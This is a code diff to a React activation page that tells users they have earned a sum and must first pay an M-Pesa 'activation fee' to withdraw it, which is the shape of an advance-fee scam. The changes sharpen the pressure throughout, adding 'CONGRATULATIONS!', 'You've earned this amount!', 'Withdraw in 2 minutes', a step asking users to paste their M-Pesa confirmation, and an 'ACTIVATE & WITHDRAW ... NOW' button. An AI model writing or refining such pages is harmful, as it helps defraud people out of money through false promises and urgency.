@@ -608,85 +608,97 @@ export default function Activate() {
           <div style={{
             marginTop: "8px",
             marginBottom: "20px",
-            padding: "18px 16px",
-            borderRadius: "16px",
-            background: `linear-gradient(135deg, ${plan.color}15, ${plan.color}05)`,
-            border: `2px solid ${plan.color}30`,
-            textAlign: "center"
+            padding: "24px 16px",
+            borderRadius: "20px",
+            background: `linear-gradient(135deg, ${plan.color}20, ${plan.color}08)`,
+            border: `2px solid ${plan.color}40`,
+            textAlign: "center",
+            position: "relative",
+            overflow: "hidden"
           }}>
+            {/* Decorative elements */}
             <div style={{
-              fontSize: "28px",
-              fontWeight: 800,
+              position: "absolute",
+              top: "-10px",
+              right: "-10px",
+              width: "80px",
+              height: "80px",
+              background: `radial-gradient(circle, ${plan.color}30, transparent 70%)`,
+              borderRadius: "50%"
+            }}></div>
+            
+            <div style={{
+              fontSize: "16px",
+              fontWeight: 600,
+              color: "#4b5563",
+              marginBottom: "8px",
+              textTransform: "uppercase",
+              letterSpacing: "1px"
+            }}>
+              🎉 CONGRATULATIONS! 🎉
+            </div>
+            
+            <div style={{
+              fontSize: "42px",
+              fontWeight: 900,
               color: plan.color,
-              lineHeight: "1.2",
-              marginBottom: "4px"
+              lineHeight: "1",
+              marginBottom: "8px",
+              textShadow: `0 2px 10px ${plan.color}40`
             }}>
               KES {plan.total}
             </div>
+            
             <div style={{
-              fontSize: "16px",
+              fontSize: "20px",
               fontWeight: 700,
-              color: "#334155",
-              marginBottom: "12px"
+              color: "#1e293b",
+              marginBottom: "16px"
             }}>
-              Ready to withdraw!
+              You've earned this amount! 🎯
             </div>
+            
             <div style={{
-              fontSize: "15px",
+              fontSize: "18px",
               fontWeight: 600,
               color: "#2563eb",
               background: "white",
-              padding: "12px 14px",
-              borderRadius: "12px",
+              padding: "16px 20px",
+              borderRadius: "50px",
               border: "1px solid #e2e8f0",
-              boxShadow: "0 4px 8px rgba(0,0,0,0.02)"
+              boxShadow: "0 8px 20px rgba(0,0,0,0.05)",
+              marginBottom: "12px"
             }}>
-              💡 Pay <span style={{ 
+              🔥 Pay <span style={{ 
                 color: "#dc2626", 
-                fontWeight: 800,
-                fontSize: "18px"
-              }}>KES {plan.activationFee}</span> activation fee 
+                fontWeight: 900,
+                fontSize: "24px"
+              }}>KES {plan.activationFee}</span> 
               <br />
-              <span style={{ fontSize: "14px", color: "#4b5563" }}>
-                to unlock your <strong style={{ color: plan.color }}>{plan.label}</strong> earnings
+              <span style={{ fontSize: "16px", color: "#4b5563" }}>
+                and withdraw <strong style={{ color: plan.color }}>KES {plan.total}</strong> to M-Pesa NOW!
               </span>
             </div>
+            
             <div style={{
-              marginTop: "12px",
               display: "flex",
               alignItems: "center",
               justifyContent: "center",
-              gap: "16px",
-              fontSize: "13px",
-              fontWeight: 600,
-              color: "#059669"
-            }}>
-              <span>⚡ Instant verification</span>
-              <span>🔒 Secure payment</span>
-              <span>✅ Lifetime access</span>
-            </div>
-          </div>
-
-          <div style={styles.sectionHighlight}>
-            <p style={{ 
-              fontWeight: 900, 
-              color: "#ef4444",
+              gap: "8px",
               fontSize: "14px",
-              marginBottom: "10px"
+              fontWeight: 600,
+              color: "#059669",
+              background: "rgba(5, 150, 105, 0.1)",
+              padding: "10px 16px",
+              borderRadius: "50px",
+              marginTop: "8px"
             }}>
-              ⚠ ACTIVATION REQUIRED
-            </p>
-            {["✔ One-time activation fee", "✔ Unlock withdrawals", "✔ Verified & secure account", "✔ Direct M-Pesa payments"].map((text, index) => (
-              <p key={index} style={{ 
-                margin: "4px 0",
-                fontSize: "13px",
-                display: "flex",
-                alignItems: "center",
-                gap: "6px"
-              }}>
-                {text}
-              </p>
-            ))}
+              <span>⚡ Withdraw in 2 minutes</span>
+              <span>•</span>
+              <span>🔒 Secure</span>
+              <span>•</span>
+              <span>✅ Instant</span>
+            </div>
           </div>
 
           {showPlanWarning && (
@@ -707,7 +719,7 @@ export default function Activate() {
 
           <div style={styles.section}>
             <p style={{ fontWeight: 900, fontSize: "14px", marginBottom: "10px" }}>
-              📲 HOW TO PAY (LIPA NA M-PESA)
+              📲 HOW TO PAY & ACTIVATE (LIPA NA M-PESA)
             </p>
 
             <p style={styles.caption}>
@@ -772,6 +784,18 @@ export default function Activate() {
                   Enter your M-PESA PIN and confirm
                 </p>
               </div>
+
+              <div style={{
+                ...styles.stepBox,
+                background: "rgba(16, 185, 129, 0.15)",
+                border: "1px solid rgba(16, 185, 129, 0.3)"
+              }}>
+                <span style={{...styles.stepNumber, background: "#10b981"}}>8</span>
+                <strong style={{ color: "#10b981" }}>Paste Confirmation Below</strong>
+                <p style={{ margin: "4px 0 0 0", fontSize: "13px", color: "#047857" }}>
+                  Copy and paste the M-Pesa message to receive KES {plan.total} instantly!
+                </p>
+              </div>
             </div>
           </div>
 
@@ -806,7 +830,7 @@ export default function Activate() {
             </span>
             <br />
             <span style={{ fontSize: "12px", color: "#3b82f6", fontWeight: 700, marginTop: "4px", display: "block" }}>
-              ℹ️ Activating: <strong>{plan.label} Plan</strong> (KES {plan.activationFee})
+              ℹ️ Activating: <strong>{plan.label} Plan</strong> (KES {plan.activationFee}) → Get KES {plan.total}
             </span>
           </div>
 
@@ -830,6 +854,8 @@ Confirmed. Ksh100.00 sent to Obadiah Otoki for account activation"
                 : `linear-gradient(135deg, ${plan.color}, ${plan.color}dd)`,
               opacity: submitting ? 0.7 : 1,
               cursor: submitting ? "not-allowed" : "pointer",
+              fontSize: "16px",
+              padding: "18px",
             }}
           >
             {submitting ? (
@@ -847,7 +873,7 @@ Confirmed. Ksh100.00 sent to Obadiah Otoki for account activation"
                 Submitting...
               </>
             ) : (
-              `Submit ${plan.label} Activation (KES ${plan.activationFee})`
+              `🚀 ACTIVATE & WITHDRAW KES ${plan.total} NOW`
             )}
           </button>
 
